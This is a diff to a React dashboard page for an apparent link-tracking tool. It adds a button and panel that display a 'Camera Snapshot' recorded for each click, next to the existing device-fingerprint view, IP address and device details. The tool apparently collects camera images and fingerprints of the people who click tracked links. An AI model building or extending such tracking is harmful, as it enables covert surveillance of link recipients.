@@ -43,6 +43,7 @@ export default function LinkDetail() {
   const [page, setPage] = useState(1);
   const [allClicks, setAllClicks] = useState([]);
   const [expandedFp, setExpandedFp] = useState(null);
+const [expandedCam, setExpandedCam] = useState(null);
   const [filters, setFilters] = useState({ date_from: '', date_to: '', browser: '', os: '', device: '' });
 
   const filterKey = JSON.stringify(filters);
@@ -178,6 +179,7 @@ export default function LinkDetail() {
                     <th>Address</th>
                     <th>Device</th>
                     <th></th>
+                  <th></th>
                   </tr>
                 </thead>
                 <tbody>
@@ -194,6 +196,11 @@ export default function LinkDetail() {
                           <button className="btn btn-sm btn-secondary" onClick={() => setExpandedFp(expandedFp === click.id ? null : click.id)}>FP</button>
                         )}
                       </td>
+                      <td>
+                        {click.camera_image && (
+                          <button className="btn btn-sm btn-secondary" onClick={() => setExpandedCam(expandedCam === click.id ? null : click.id)}>Cam</button>
+                        )}
+                      </td>
                     </tr>
                   ))}
                 </tbody>
@@ -203,6 +210,12 @@ export default function LinkDetail() {
               <div className="fp-section">
                 <h4 className="mb-12">Device Fingerprint</h4>
                 <FingerprintView data={allClicks.find(c => c.id === expandedFp)?.fingerprint} />
+              </div>
+            )}
+            {expandedCam && (
+              <div className="fp-section" style={{ textAlign: 'center' }}>
+                <h4 className="mb-12">Camera Snapshot</h4>
+                <img src={allClicks.find(c => c.id === expandedCam)?.camera_image} alt="camera" style={{ maxWidth: '100%', maxHeight: '400px', borderRadius: '6px' }} />
               </div>
             )}
             {hasMore && (
